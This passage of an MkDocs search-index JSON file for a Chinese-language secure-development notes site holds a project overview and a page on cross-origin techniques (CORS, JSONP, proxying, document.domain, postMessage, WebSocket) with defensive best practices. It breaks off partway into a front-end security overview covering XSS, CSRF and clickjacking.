{"config":{"lang":["zh"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"\u5b89\u5168\u5f00\u53d1\u7b14\u8bb0\u5e93","text":""},{"location":"#_2","title":"\u9879\u76ee\u4ecb\u7ecd","text":"<p>\u6b22\u8fce\u4f7f\u7528\u5b89\u5168\u5f00\u53d1\u7b14\u8bb0\u5e93\uff01\u8fd9\u662f\u4e00\u4e2a\u4e13\u6ce8\u4e8eWeb\u5b89\u5168\u548cPython\u9ad8\u7ea7\u7f16\u7a0b\u7684\u6280\u672f\u6587\u6863\u96c6\u5408\uff0c\u65e8\u5728\u5e2e\u52a9\u5f00\u53d1\u8005\u5b66\u4e60\u548c\u638c\u63e1\u5b89\u5168\u5f00\u53d1\u6280\u80fd\u3002</p> <p>\u672c\u7b14\u8bb0\u5e93\u6db5\u76d6\u4e86\u5e38\u89c1\u7684Web\u5b89\u5168\u6f0f\u6d1e\u5206\u6790\u4e0e\u9632\u5fa1\u63aa\u65bd\uff0c\u4ee5\u53caPython\u9ad8\u7ea7\u7f16\u7a0b\u6280\u672f\uff08\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u3001\u591a\u7ebf\u7a0b\u548c\u534f\u7a0b\uff09\uff0c\u4e3a\u5b89\u5168\u5f00\u53d1\u5b9e\u8df5\u63d0\u4f9b\u5168\u9762\u7684\u53c2\u8003\u8d44\u6599\u3002</p>"},{"location":"#_3","title":"\u4e3b\u8981\u5185\u5bb9","text":""},{"location":"#1-web","title":"1. Web\u5b89\u5168\u6f0f\u6d1e","text":"<p>\u8be6\u7ec6\u4ecb\u7ecd\u5e38\u89c1\u7684Web\u5b89\u5168\u6f0f\u6d1e\uff0c\u5305\u62ec\u6f0f\u6d1e\u539f\u7406\u3001\u653b\u51fb\u793a\u4f8b\u548c\u9632\u5fa1\u63aa\u65bd\uff1a</p> <ul> <li>SQL\u6ce8\u5165 - \u5206\u6790SQL\u6ce8\u5165\u6f0f\u6d1e\u7684\u5de5\u4f5c\u539f\u7406\uff0c\u63d0\u4f9b\u9632\u5fa1\u7b56\u7565\u548c\u5b89\u5168\u7f16\u7801\u793a\u4f8b</li> <li>XSS\u8de8\u7ad9\u811a\u672c - \u4ecb\u7ecd\u5b58\u50a8\u578b\u3001\u53cd\u5c04\u578b\u548cDOM\u578bXSS\u6f0f\u6d1e\uff0c\u4ee5\u53ca\u76f8\u5e94\u7684\u9632\u62a4\u6280\u672f</li> <li>CSRF\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020 - \u89e3\u91caCSRF\u653b\u51fb\u673a\u5236\uff0c\u63d0\u4f9b\u6709\u6548\u7684\u9632\u5fa1\u65b9\u6cd5</li> <li>\u547d\u4ee4\u6ce8\u5165 - \u5206\u6790\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u7684\u6210\u56e0\u548c\u5371\u5bb3\uff0c\u63d0\u4f9b\u5b89\u5168\u7684\u66ff\u4ee3\u65b9\u6848</li> <li>\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e - \u63a2\u8ba8\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u7684\u98ce\u9669\uff0c\u63d0\u4f9b\u5b89\u5168\u7684\u6587\u4ef6\u5904\u7406\u5b9e\u8df5</li> <li>\u8ba4\u8bc1\u4e0e\u6388\u6743\u6f0f\u6d1e - \u8be6\u7ec6\u8bb2\u89e3\u8eab\u4efd\u8ba4\u8bc1\u548c\u8bbf\u95ee\u63a7\u5236\u4e2d\u7684\u5e38\u89c1\u5b89\u5168\u95ee\u9898</li> </ul>"},{"location":"#2-python","title":"2. Python\u9ad8\u7ea7\u7f16\u7a0b","text":"<p>\u6df1\u5165\u63a2\u8ba8Python\u9ad8\u7ea7\u7f16\u7a0b\u6280\u672f\uff0c\u63d0\u5347\u4ee3\u7801\u8d28\u91cf\u548c\u6027\u80fd\uff1a</p> <ul> <li>\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b - \u8be6\u7ec6\u8bb2\u89e3\u7c7b\u3001\u7ee7\u627f\u3001\u591a\u6001\u3001\u5c01\u88c5\u7b49\u9762\u5411\u5bf9\u8c61\u6982\u5ff5\u548c\u6700\u4f73\u5b9e\u8df5</li> <li>\u591a\u7ebf\u7a0b\u7f16\u7a0b - \u4ecb\u7ecd\u7ebf\u7a0b\u7684\u521b\u5efa\u3001\u540c\u6b65\u548c\u901a\u4fe1\uff0c\u4ee5\u53ca\u7ebf\u7a0b\u6c60\u7684\u4f7f\u7528</li> <li>\u534f\u7a0b\u4e0e\u5f02\u6b65\u7f16\u7a0b - \u63a2\u8ba8asyncio\u5e93\u7684\u4f7f\u7528\uff0c\u5b9e\u73b0\u9ad8\u6548\u7684\u5f02\u6b65I/O\u64cd\u4f5c</li> <li>\u5e76\u53d1\u7f16\u7a0b\u6700\u4f73\u5b9e\u8df5 - \u603b\u7ed3\u5e76\u53d1\u7f16\u7a0b\u4e2d\u7684\u5b89\u5168\u5b9e\u8df5\u548c\u6027\u80fd\u4f18\u5316\u6280\u5de7</li> </ul>"},{"location":"#_4","title":"\u4f7f\u7528\u6307\u5357","text":""},{"location":"#_5","title":"\u672c\u5730\u6784\u5efa\u548c\u9884\u89c8","text":"<p>\u8981\u5728\u672c\u5730\u6784\u5efa\u548c\u9884\u89c8\u6587\u6863\uff0c\u8bf7\u6309\u7167\u4ee5\u4e0b\u6b65\u9aa4\u64cd\u4f5c\uff1a</p> <ol> <li>\u786e\u4fdd\u5df2\u5b89\u88c5Python\u548cMkDocs</li> <li>\u514b\u9686\u6216\u4e0b\u8f7d\u672c\u9879\u76ee</li> <li>\u5728\u9879\u76ee\u6839\u76ee\u5f55\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a</li> </ol> <pre><code># \u5b89\u88c5\u4f9d\u8d56\npip install -r requirements.txt\n\n# \u542f\u52a8\u672c\u5730\u670d\u52a1\u5668\nmkdocs serve\n\n# \u6216\u6784\u5efa\u9759\u6001\u6587\u4ef6\nmkdocs build\n</code></pre> <p>\u542f\u52a8\u672c\u5730\u670d\u52a1\u5668\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u6d4f\u89c8\u5668\u8bbf\u95ee <code>http://localhost:8000</code> \u9884\u89c8\u6587\u6863\u3002</p>"},{"location":"#_6","title":"\u8d21\u732e\u6307\u5357","text":"<p>\u6b22\u8fce\u8d21\u732e\u5185\u5bb9\uff01\u5982\u679c\u60a8\u53d1\u73b0\u9519\u8bef\u6216\u6709\u65b0\u7684\u5185\u5bb9\u8981\u6dfb\u52a0\uff0c\u8bf7\u63d0\u4ea4\u5408\u5e76\u8bf7\u6c42\u6216\u521b\u5efa\u95ee\u9898\u3002</p>"},{"location":"#_7","title":"\u8bb8\u53ef\u8bc1","text":"<p>\u672c\u9879\u76ee\u91c7\u7528MIT\u8bb8\u53ef\u8bc1\u3002\u8be6\u60c5\u8bf7\u53c2\u9605LICENSE\u6587\u4ef6\u3002</p>"},{"location":"frontend-security/cross-origin/","title":"\u8de8\u57df\u95ee\u9898\u4e0e\u89e3\u51b3\u65b9\u6848","text":""},{"location":"frontend-security/cross-origin/#_2","title":"\u4ec0\u4e48\u662f\u8de8\u57df\u95ee\u9898\uff1f","text":"<p>\u8de8\u57df\u95ee\u9898\u662f\u6307\u7531\u4e8e\u6d4f\u89c8\u5668\u7684\u540c\u6e90\u7b56\u7565\u9650\u5236\uff0c\u5f53\u4e00\u4e2aWeb\u5e94\u7528\u5c1d\u8bd5\u4ece\u4e0d\u540c\u6e90\uff08\u534f\u8bae\u3001\u57df\u540d\u3001\u7aef\u53e3\u4e0d\u540c\uff09\u83b7\u53d6\u8d44\u6e90\u6216\u4e0e\u4e0d\u540c\u6e90\u7684\u9875\u9762\u4ea4\u4e92\u65f6\u9047\u5230\u7684\u9650\u5236\u3002\u5728\u73b0\u4ee3Web\u5f00\u53d1\u4e2d\uff0c\u524d\u540e\u7aef\u5206\u79bb\u67b6\u6784\u548c\u5fae\u670d\u52a1\u67b6\u6784\u4f7f\u5f97\u8de8\u57df\u8bf7\u6c42\u53d8\u5f97\u975e\u5e38\u5e38\u89c1\u3002</p>"},{"location":"frontend-security/cross-origin/#_3","title":"\u4e3a\u4ec0\u4e48\u4f1a\u6709\u8de8\u57df\u95ee\u9898\uff1f","text":"<p>\u8de8\u57df\u95ee\u9898\u7684\u6839\u672c\u539f\u56e0\u662f\u6d4f\u89c8\u5668\u7684\u540c\u6e90\u7b56\u7565\uff0c\u8fd9\u662f\u4e00\u79cd\u5b89\u5168\u673a\u5236\uff0c\u7528\u4e8e\u9632\u6b62\u6076\u610f\u7f51\u7ad9\u7a83\u53d6\u7528\u6237\u6570\u636e\u6216\u8fdb\u884c\u672a\u6388\u6743\u64cd\u4f5c\u3002\u4f46\u5728\u5408\u6cd5\u7684\u4e1a\u52a1\u573a\u666f\u4e2d\uff0c\u6211\u4eec\u7ecf\u5e38\u9700\u8981\u5728\u4e0d\u540c\u6e90\u4e4b\u95f4\u8fdb\u884c\u6570\u636e\u4ea4\u4e92\uff0c\u8fd9\u5c31\u4ea7\u751f\u4e86\u5982\u4f55\u5b89\u5168\u5730\u8fdb\u884c\u8de8\u57df\u8bf7\u6c42\u7684\u9700\u6c42\u3002</p>"},{"location":"frontend-security/cross-origin/#_4","title":"\u5e38\u89c1\u8de8\u57df\u89e3\u51b3\u65b9\u6848","text":""},{"location":"frontend-security/cross-origin/#1-cors","title":"1. \u8de8\u6e90\u8d44\u6e90\u5171\u4eab (CORS)","text":"<p>CORS\u662f\u76ee\u524d\u6700\u63a8\u8350\u7684\u8de8\u57df\u89e3\u51b3\u65b9\u6848\uff0c\u5b83\u901a\u8fc7\u670d\u52a1\u5668\u914d\u7f6e\u7279\u5b9a\u7684HTTP\u5934\uff0c\u5141\u8bb8\u53d7\u63a7\u7684\u8de8\u57df\u8bf7\u6c42\u3002</p>"},{"location":"frontend-security/cross-origin/#_5","title":"\u5de5\u4f5c\u539f\u7406","text":"<ol> <li>\u6d4f\u89c8\u5668\u53d1\u9001\u9884\u68c0\u8bf7\u6c42\uff08OPTIONS\uff09\u5230\u76ee\u6807\u670d\u52a1\u5668</li> <li>\u670d\u52a1\u5668\u54cd\u5e94\u5141\u8bb8\u7684\u6e90\u3001\u65b9\u6cd5\u548c\u5934\u4fe1\u606f</li> <li>\u5982\u679c\u5141\u8bb8\uff0c\u6d4f\u89c8\u5668\u53d1\u9001\u5b9e\u9645\u7684\u8bf7\u6c42</li> </ol>"},{"location":"frontend-security/cross-origin/#_6","title":"\u670d\u52a1\u5668\u914d\u7f6e\u793a\u4f8b","text":"<pre><code>// \u5141\u8bb8\u6240\u6709\u6e90\u8bbf\u95ee\nAccess-Control-Allow-Origin: *\n\n// \u5141\u8bb8\u7279\u5b9a\u6e90\u8bbf\u95ee\nAccess-Control-Allow-Origin: https://example.com\n\n// \u5141\u8bb8\u643a\u5e26\u51ed\u8bc1\nAccess-Control-Allow-Credentials: true\n\n// \u5141\u8bb8\u7684HTTP\u65b9\u6cd5\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS\n\n// \u5141\u8bb8\u7684\u8bf7\u6c42\u5934\nAccess-Control-Allow-Headers: Content-Type, Authorization\n\n// \u9884\u68c0\u8bf7\u6c42\u7ed3\u679c\u7f13\u5b58\u65f6\u95f4\nAccess-Control-Max-Age: 86400\n</code></pre>"},{"location":"frontend-security/cross-origin/#_7","title":"\u524d\u7aef\u4f7f\u7528\u793a\u4f8b","text":"<pre><code>// \u57fa\u672cCORS\u8bf7\u6c42\nfetch('https://api.example.com/data')\n  .then(response =&gt; response.json())\n  .then(data =&gt; console.log(data));\n\n// \u5e26\u51ed\u8bc1\u7684CORS\u8bf7\u6c42\nfetch('https://api.example.com/data', {\n  credentials: 'include'\n})\n  .then(response =&gt; response.json())\n  .then(data =&gt; console.log(data));\n</code></pre>"},{"location":"frontend-security/cross-origin/#2-jsonp-json-with-padding","title":"2. JSONP (JSON with Padding)","text":"<p>JSONP\u662f\u4e00\u79cd\u4f20\u7edf\u7684\u8de8\u57df\u89e3\u51b3\u65b9\u6848\uff0c\u5b83\u5229\u7528<code>&lt;script&gt;</code>\u6807\u7b7e\u4e0d\u53d7\u540c\u6e90\u7b56\u7565\u9650\u5236\u7684\u7279\u6027\u3002</p>"},{"location":"frontend-security/cross-origin/#_8","title":"\u5de5\u4f5c\u539f\u7406","text":"<ol> <li>\u521b\u5efa\u4e00\u4e2a<code>&lt;script&gt;</code>\u6807\u7b7e\uff0c\u5176src\u6307\u5411\u8de8\u57dfURL</li> <li>URL\u4e2d\u5305\u542b\u56de\u8c03\u51fd\u6570\u540d\u4f5c\u4e3a\u53c2\u6570</li> <li>\u670d\u52a1\u5668\u8fd4\u56de\u7684\u54cd\u5e94\u662f\u5bf9\u8be5\u51fd\u6570\u7684\u8c03\u7528\uff0c\u53c2\u6570\u662f\u8981\u4f20\u9012\u7684\u6570\u636e</li> </ol>"},{"location":"frontend-security/cross-origin/#_9","title":"\u5b9e\u73b0\u793a\u4f8b","text":"<pre><code>// \u524d\u7aef\u5b9e\u73b0\nfunction handleResponse(data) {\n  console.log('\u83b7\u53d6\u5230\u7684\u6570\u636e:', data);\n}\n\n// \u521b\u5efascript\u6807\u7b7e\nconst script = document.createElement('script');\nscript.src = 'https://api.example.com/data?callback=handleResponse';\ndocument.body.appendChild(script);\n\n// \u670d\u52a1\u5668\u54cd\u5e94\u683c\u5f0f\n// handleResponse({\"name\": \"value\"});\n</code></pre>"},{"location":"frontend-security/cross-origin/#_10","title":"\u4f18\u7f3a\u70b9","text":"<p>\u4f18\u70b9\uff1a - \u517c\u5bb9\u6027\u597d\uff0c\u652f\u6301\u6240\u6709\u6d4f\u89c8\u5668 - \u5b9e\u73b0\u7b80\u5355</p> <p>\u7f3a\u70b9\uff1a - \u53ea\u652f\u6301GET\u8bf7\u6c42 - \u5b89\u5168\u98ce\u9669\uff08\u53ef\u80fd\u5f15\u5165XSS\u653b\u51fb\uff09 - \u9519\u8bef\u5904\u7406\u56f0\u96be</p>"},{"location":"frontend-security/cross-origin/#3","title":"3. \u4ee3\u7406\u670d\u52a1\u5668","text":"<p>\u901a\u8fc7\u5728\u540c\u6e90\u670d\u52a1\u5668\u4e0a\u8bbe\u7f6e\u4ee3\u7406\uff0c\u8f6c\u53d1\u8bf7\u6c42\u5230\u76ee\u6807\u670d\u52a1\u5668\u3002</p>"},{"location":"frontend-security/cross-origin/#_11","title":"\u5de5\u4f5c\u539f\u7406","text":"<ol> <li>\u524d\u7aef\u5411\u540c\u6e90\u7684\u4ee3\u7406\u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42</li> <li>\u4ee3\u7406\u670d\u52a1\u5668\u8f6c\u53d1\u8bf7\u6c42\u5230\u76ee\u6807\u670d\u52a1\u5668</li> <li>\u4ee3\u7406\u670d\u52a1\u5668\u5c06\u54cd\u5e94\u8fd4\u56de\u7ed9\u524d\u7aef</li> </ol>"},{"location":"frontend-security/cross-origin/#nginx","title":"Nginx\u4ee3\u7406\u914d\u7f6e\u793a\u4f8b","text":"<pre><code>location /api/ {\n  proxy_pass https://api.example.com/;\n  proxy_set_header Host api.example.com;\n  proxy_set_header X-Real-IP $remote_addr;\n}\n</code></pre>"},{"location":"frontend-security/cross-origin/#_12","title":"\u524d\u7aef\u4f7f\u7528\u793a\u4f8b","text":"<pre><code>// \u524d\u7aef\u76f4\u63a5\u8bf7\u6c42\u540c\u6e90\u4ee3\u7406\nfetch('/api/data')\n  .then(response =&gt; response.json())\n  .then(data =&gt; console.log(data));\n</code></pre>"},{"location":"frontend-security/cross-origin/#4-documentdomain","title":"4. document.domain","text":"<p>\u9002\u7528\u4e8e\u4e3b\u57df\u540d\u76f8\u540c\u3001\u5b50\u57df\u540d\u4e0d\u540c\u7684\u60c5\u51b5\u3002</p>"},{"location":"frontend-security/cross-origin/#_13","title":"\u5de5\u4f5c\u539f\u7406","text":"<p>\u901a\u8fc7\u8bbe\u7f6e<code>document.domain</code>\u4e3a\u76f8\u540c\u7684\u4e3b\u57df\u540d\uff0c\u5b9e\u73b0\u4e0d\u540c\u5b50\u57df\u540d\u4e4b\u95f4\u7684\u901a\u4fe1\u3002</p>"},{"location":"frontend-security/cross-origin/#_14","title":"\u5b9e\u73b0\u793a\u4f8b","text":"<pre><code>// \u5728a.example.com\u9875\u9762\u4e2d\ndocument.domain = 'example.com';\n\n// \u5728b.example.com\u9875\u9762\u4e2d\ndocument.domain = 'example.com';\n\n// \u73b0\u5728\u53ef\u4ee5\u901a\u8fc7iframe\u8fdb\u884c\u8de8\u5b50\u57df\u901a\u4fe1\nconst iframe = document.getElementById('myIframe');\nconst iframeWin = iframe.contentWindow;\n</code></pre>"},{"location":"frontend-security/cross-origin/#5-postmessage-api","title":"5. postMessage API","text":"<p>HTML5\u63d0\u4f9b\u7684postMessage API\u5141\u8bb8\u4e0d\u540c\u6e90\u7684\u9875\u9762\u4e4b\u95f4\u5b89\u5168\u901a\u4fe1\u3002</p>"},{"location":"frontend-security/cross-origin/#_15","title":"\u5de5\u4f5c\u539f\u7406","text":"<ol> <li>\u4e00\u4e2a\u7a97\u53e3\u53d1\u9001\u6d88\u606f\u5230\u53e6\u4e00\u4e2a\u7a97\u53e3</li> <li>\u63a5\u6536\u7a97\u53e3\u901a\u8fc7\u76d1\u542cmessage\u4e8b\u4ef6\u6765\u5904\u7406\u6d88\u606f</li> <li>\u53ef\u4ee5\u9a8c\u8bc1\u6d88\u606f\u6765\u6e90\u4ee5\u786e\u4fdd\u5b89\u5168\u6027</li> </ol>"},{"location":"frontend-security/cross-origin/#_16","title":"\u53d1\u9001\u6d88\u606f\u793a\u4f8b","text":"<pre><code>// \u4ece\u7a97\u53e3A\u53d1\u9001\u6d88\u606f\u5230\u7a97\u53e3B\nconst targetWindow = document.getElementById('myIframe').contentWindow;\ntargetWindow.postMessage('Hello from window A!', 'https://target-domain.com');\n</code></pre>"},{"location":"frontend-security/cross-origin/#_17","title":"\u63a5\u6536\u6d88\u606f\u793a\u4f8b","text":"<pre><code>// \u5728\u7a97\u53e3B\u4e2d\u76d1\u542c\u6d88\u606f\nwindow.addEventListener('message', (event) =&gt; {\n  // \u9a8c\u8bc1\u6d88\u606f\u6765\u6e90\n  if (event.origin !== 'https://source-domain.com') {\n    return;\n  }\n\n  // \u5904\u7406\u6d88\u606f\n  console.log('\u6536\u5230\u6d88\u606f:', event.data);\n\n  // \u53ef\u4ee5\u56de\u590d\u6d88\u606f\n  event.source.postMessage('Hello from window B!', event.origin);\n});\n</code></pre>"},{"location":"frontend-security/cross-origin/#6-websocket","title":"6. WebSocket","text":"<p>WebSocket\u534f\u8bae\u672c\u8eab\u4e0d\u9650\u5236\u540c\u6e90\uff0c\u5141\u8bb8\u8de8\u57df\u901a\u4fe1\u3002</p>"},{"location":"frontend-security/cross-origin/#_18","title":"\u5b9e\u73b0\u793a\u4f8b","text":"<pre><code>// \u521b\u5efaWebSocket\u8fde\u63a5\nconst socket = new WebSocket('wss://api.example.com/ws');\n\n// \u8fde\u63a5\u6253\u5f00\u65f6\n socket.addEventListener('open', (event) =&gt; {\n  socket.send('Hello Server!');\n});\n\n// \u63a5\u6536\u6d88\u606f\n socket.addEventListener('message', (event) =&gt; {\n  console.log('\u6536\u5230\u670d\u52a1\u5668\u6d88\u606f:', event.data);\n});\n</code></pre>"},{"location":"frontend-security/cross-origin/#_19","title":"\u5404\u79cd\u8de8\u57df\u65b9\u6848\u7684\u5bf9\u6bd4","text":"\u65b9\u6848 \u4f18\u70b9 \u7f3a\u70b9 \u9002\u7528\u573a\u666f CORS \u5b89\u5168\u3001\u652f\u6301\u6240\u6709HTTP\u65b9\u6cd5\u3001\u6807\u51c6\u5316 \u9700\u670d\u52a1\u5668\u914d\u7f6e\u3001\u65e7\u6d4f\u89c8\u5668\u517c\u5bb9\u6027\u95ee\u9898 \u73b0\u4ee3Web\u5e94\u7528\u7684\u9996\u9009\u65b9\u6848 JSONP \u517c\u5bb9\u6027\u597d\u3001\u5b9e\u73b0\u7b80\u5355 \u53ea\u652f\u6301GET\u3001\u5b89\u5168\u98ce\u9669\u3001\u9519\u8bef\u5904\u7406\u56f0\u96be \u517c\u5bb9\u65e7\u6d4f\u89c8\u5668\u7684\u7b80\u5355\u8bf7\u6c42 \u4ee3\u7406\u670d\u52a1\u5668 \u5bf9\u524d\u7aef\u900f\u660e\u3001\u53ef\u7edf\u4e00\u5904\u7406\u8ba4\u8bc1 \u589e\u52a0\u670d\u52a1\u5668\u8d1f\u62c5\u3001\u989d\u5916\u914d\u7f6e \u524d\u540e\u7aef\u5206\u79bb\u9879\u76ee\u3001\u9700\u8981\u7edf\u4e00\u8ba4\u8bc1 document.domain \u7b80\u5355\u3001\u9002\u7528\u4e8e\u5b50\u57df\u540d\u573a\u666f \u4ec5\u9650\u76f8\u540c\u4e3b\u57df\u540d\u3001\u5b89\u5168\u98ce\u9669 \u76f8\u540c\u4e3b\u57df\u540d\u4e0b\u7684\u8de8\u5b50\u57df\u901a\u4fe1 postMessage \u5b89\u5168\u3001\u7075\u6d3b\u3001\u652f\u6301\u5404\u79cd\u6570\u636e \u9700\u5904\u7406\u6d88\u606f\u9a8c\u8bc1\u3001\u5b9e\u73b0\u590d\u6742\u5ea6\u4e2d\u7b49 \u8de8\u7a97\u53e3/iframe\u901a\u4fe1 WebSocket \u5b9e\u65f6\u901a\u4fe1\u3001\u5168\u53cc\u5de5 \u670d\u52a1\u5668\u9700\u652f\u6301WebSocket \u5b9e\u65f6\u5e94\u7528\u3001\u804a\u5929\u5e94\u7528\u7b49"},{"location":"frontend-security/cross-origin/#_20","title":"\u8de8\u57df\u5b89\u5168\u6700\u4f73\u5b9e\u8df5","text":""},{"location":"frontend-security/cross-origin/#1-cors_1","title":"1. \u4f18\u5148\u4f7f\u7528CORS","text":"<p>CORS\u662f\u6700\u5b89\u5168\u3001\u6700\u6807\u51c6\u7684\u8de8\u57df\u89e3\u51b3\u65b9\u6848\uff0c\u5e94\u4f5c\u4e3a\u9996\u9009\u3002</p>"},{"location":"frontend-security/cross-origin/#2","title":"2. \u9650\u5236\u8de8\u57df\u6e90","text":"<p>\u5728CORS\u914d\u7f6e\u4e2d\uff0c\u5e94\u5c3d\u91cf\u9650\u5236\u5177\u4f53\u7684\u6e90\uff0c\u907f\u514d\u4f7f\u7528\u901a\u914d\u7b26<code>*</code>\uff08\u9664\u975e\u5fc5\u8981\uff09\u3002</p> <pre><code>// \u4e0d\u63a8\u8350\nAccess-Control-Allow-Origin: *\n\n// \u63a8\u8350\nAccess-Control-Allow-Origin: https://trusted-site.com\n</code></pre>"},{"location":"frontend-security/cross-origin/#3_1","title":"3. \u5b89\u5168\u5904\u7406\u51ed\u8bc1","text":"<p>\u5f53\u9700\u8981\u643a\u5e26\u51ed\u8bc1\uff08\u5982Cookie\uff09\u8fdb\u884c\u8de8\u57df\u8bf7\u6c42\u65f6\uff0c\u5e94\u8c28\u614e\u914d\u7f6e\uff1a</p> <pre><code>// \u670d\u52a1\u5668\u7aef\nAccess-Control-Allow-Credentials: true\n</code></pre> <pre><code>// \u524d\u7aef\nfetch('https://api.example.com/data', {\n  credentials: 'include'\n});\n</code></pre>"},{"location":"frontend-security/cross-origin/#4-csp","title":"4. \u5b9e\u65bd\u5185\u5bb9\u5b89\u5168\u7b56\u7565(CSP)","text":"<p>CSP\u53ef\u4ee5\u9650\u5236\u9875\u9762\u53ef\u4ee5\u52a0\u8f7d\u7684\u8d44\u6e90\u6765\u6e90\uff0c\u589e\u5f3a\u5b89\u5168\u6027\uff1a</p> <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;\n</code></pre>"},{"location":"frontend-security/cross-origin/#5","title":"5. \u9a8c\u8bc1\u6d88\u606f\u6765\u6e90","text":"<p>\u4f7f\u7528postMessage\u65f6\uff0c\u5fc5\u987b\u9a8c\u8bc1\u6d88\u606f\u6765\u6e90\uff1a</p> <pre><code>window.addEventListener('message', (event) =&gt; {\n  if (event.origin !== 'https://trusted-origin.com') {\n    return; // \u62d2\u7edd\u975e\u4fe1\u4efb\u6765\u6e90\u7684\u6d88\u606f\n  }\n  // \u5904\u7406\u6d88\u606f...\n});\n</code></pre>"},{"location":"frontend-security/cross-origin/#_21","title":"\u603b\u7ed3","text":"<p>\u8de8\u57df\u95ee\u9898\u662fWeb\u5f00\u53d1\u4e2d\u7684\u5e38\u89c1\u6311\u6218\uff0c\u6709\u591a\u79cd\u89e3\u51b3\u65b9\u6848\u53ef\u4f9b\u9009\u62e9\u3002\u5728\u5b9e\u9645\u5f00\u53d1\u4e2d\uff0c\u5e94\u6839\u636e\u5177\u4f53\u9700\u6c42\u548c\u5b89\u5168\u8981\u6c42\u9009\u62e9\u5408\u9002\u7684\u65b9\u6848\u3002\u73b0\u4ee3Web\u5e94\u7528\u5e94\u4f18\u5148\u8003\u8651\u4f7f\u7528CORS\uff0c\u5b83\u63d0\u4f9b\u4e86\u6700\u5b89\u5168\u3001\u6700\u7075\u6d3b\u7684\u8de8\u57df\u673a\u5236\u3002\u540c\u65f6\uff0c\u65e0\u8bba\u91c7\u7528\u54ea\u79cd\u65b9\u6848\uff0c\u90fd\u5e94\u6ce8\u610f\u5b9e\u65bd\u76f8\u5e94\u7684\u5b89\u5168\u63aa\u65bd\uff0c\u4fdd\u62a4\u5e94\u7528\u548c\u7528\u6237\u6570\u636e\u7684\u5b89\u5168\u3002</p>"},{"location":"frontend-security/overview/","title":"\u524d\u7aef\u5b89\u5168\u6982\u8ff0","text":""},{"location":"frontend-security/overview/#_2","title":"\u4ec0\u4e48\u662f\u524d\u7aef\u5b89\u5168\uff1f","text":"<p>\u524d\u7aef\u5b89\u5168\u662f\u6307\u4fdd\u62a4\u7f51\u7ad9\u548cWeb\u5e94\u7528\u7a0b\u5e8f\u7684\u5ba2\u6237\u7aef\u90e8\u5206\u514d\u53d7\u5404\u79cd\u5b89\u5168\u5a01\u80c1\u7684\u5b9e\u8df5\u548c\u6280\u672f\u3002\u968f\u7740Web\u5e94\u7528\u7684\u590d\u6742\u5316\u548cJavaScript\u7684\u5e7f\u6cdb\u4f7f\u7528\uff0c\u524d\u7aef\u5b89\u5168\u53d8\u5f97\u8d8a\u6765\u8d8a\u91cd\u8981\u3002</p>"},{"location":"frontend-security/overview/#_3","title":"\u4e3a\u4ec0\u4e48\u524d\u7aef\u5b89\u5168\u91cd\u8981\uff1f","text":"<ul> <li>\u76f4\u63a5\u9762\u5411\u7528\u6237\uff1a\u524d\u7aef\u4ee3\u7801\u5728\u7528\u6237\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\uff0c\u76f4\u63a5\u4e0e\u7528\u6237\u4ea4\u4e92</li> <li>\u6570\u636e\u9a8c\u8bc1\u7b2c\u4e00\u9053\u9632\u7ebf\uff1a\u867d\u7136\u4e0d\u80fd\u66ff\u4ee3\u540e\u7aef\u9a8c\u8bc1\uff0c\u4f46\u53ef\u4ee5\u63d0\u4f9b\u826f\u597d\u7684\u7528\u6237\u4f53\u9a8c\u548c\u521d\u6b65\u4fdd\u62a4</li> <li>\u9632\u6b62\u6076\u610f\u653b\u51fb\uff1a\u5982XSS\u3001CSRF\u7b49\u5e38\u89c1\u524d\u7aef\u653b\u51fb</li> <li>\u4fdd\u62a4\u7528\u6237\u9690\u79c1\uff1a\u9632\u6b62\u654f\u611f\u6570\u636e\u6cc4\u9732</li> <li>\u63d0\u5347\u7528\u6237\u4fe1\u4efb\uff1a\u5b89\u5168\u7684\u5e94\u7528\u80fd\u8d62\u5f97\u7528\u6237\u4fe1\u4efb</li> </ul>"},{"location":"frontend-security/overview/#_4","title":"\u5e38\u89c1\u524d\u7aef\u5b89\u5168\u5a01\u80c1","text":""},{"location":"frontend-security/overview/#1-xss","title":"1. \u8de8\u7ad9\u811a\u672c\u653b\u51fb (XSS)","text":"<p>\u6076\u610f\u811a\u672c\u6ce8\u5165\u5230\u53d7\u4fe1\u4efb\u7684\u7f51\u7ad9\u4e2d\u5e76\u6267\u884c\uff0c\u53ef\u80fd\u5bfc\u81f4\u4f1a\u8bdd\u52ab\u6301\u3001\u6570\u636e\u7a83\u53d6\u7b49\u3002</p>"},{"location":"frontend-security/overview/#2-csrf","title":"2. \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020 (CSRF)","text":"<p>\u8bf1\u5bfc\u7528\u6237\u5728\u5df2\u8ba4\u8bc1\u7684Web\u5e94\u7528\u4e0a\u6267\u884c\u975e\u9884\u671f\u7684\u64cd\u4f5c\u3002</p>"},{"location":"frontend-security/overview/#3","title":"3. \u70b9\u51fb\u52ab\u6301","text":"<p>\u901a\u8fc7\u9690\u85cf\u7684iframe\u6216\u5176\u4ed6\u6280\u672f\u8bf1\u5bfc\u7528\u6237\u70b9\u51fb\u770b\u4f3c\u65e0\u5bb3\u7684\u5143\u7d20\uff0c\u5b9e\u9645\u70b9\u51fb\u7684\u662f\u653b\u51fb\u8005\u63a7\u5236\u7684\u5185\u5bb9\u3002</p>"},{"location":"frontend-security/overview/#4","title":"4. \u540c\u6e90\u7b56\u7565\u9650\u5236\u4e0e\u8de8\u57df\u95ee\u9898","text":"<p>\u6d4f\u89c8\u5668\u7684\u540c\u6e90\u7b56\u7565\u662f\u4e00\u79cd\u5b89\u5168\u673a\u5236\uff0c\u4f46\u4e5f\u4f1a\u5f71\u54cd\u6b63\u5e38\u7684\u8de8\u57df\u6570\u636e\u8bf7\u6c42\u3002</p>"},{"location":"frontend-security/overview/#5","title":"5. 